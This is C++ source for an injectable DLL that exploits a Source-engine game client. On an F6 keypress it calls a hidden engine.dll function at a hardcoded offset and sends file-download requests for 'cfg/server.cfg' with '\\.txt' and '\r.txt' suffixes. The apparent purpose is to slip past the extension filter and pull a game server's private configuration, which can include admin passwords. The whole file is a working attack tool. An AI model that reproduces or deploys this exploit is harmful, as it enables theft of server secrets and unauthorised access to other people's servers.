#pragma once

#include "requestfile.h"



void file_download()
{

	INetChannel *net = (INetChannel*)g_pEngine->GetNetChannelInfo();

	if (!net)
	{
		Msg("No netchan!\n");
		return;
	}

	static auto funfunc = (void(__thiscall *)(void *, const char*str))((char*)GetModuleHandleA("engine.dll") + 0x1002C0);
	funfunc(net, "cfg/server.cfg\\.txt");
	funfunc(net, "cfg/server.cfg\r.txt");


	Msg("Downloading file!\n");

}


int RequestFile::Init()
{
	if (Initiated)
		return 0;

	Initiated = true;
	
	std::string init = InitializeSdk();

	if (init != "")
	{
		MessageBoxA(NULL, init.c_str(), "!ERROR!", MB_OK);
		return 0;
	}

	while (true)
	{
		if (GetAsyncKeyState(VK_F6))
		{
			file_download();
			_sleep(300);
		}
		_sleep(1);

	}
	return 1;
}

int DllInit()
{
	RequestFile::Init();
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{

	if (reason == DLL_PROCESS_ATTACH)
	{



		HANDLE thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllInit, NULL, CREATE_SUSPENDED, 0);
		Sleep(5);
		ResumeThread(thread);
		DisableThreadLibraryCalls(hModule);
	}

	return TRUE;
}


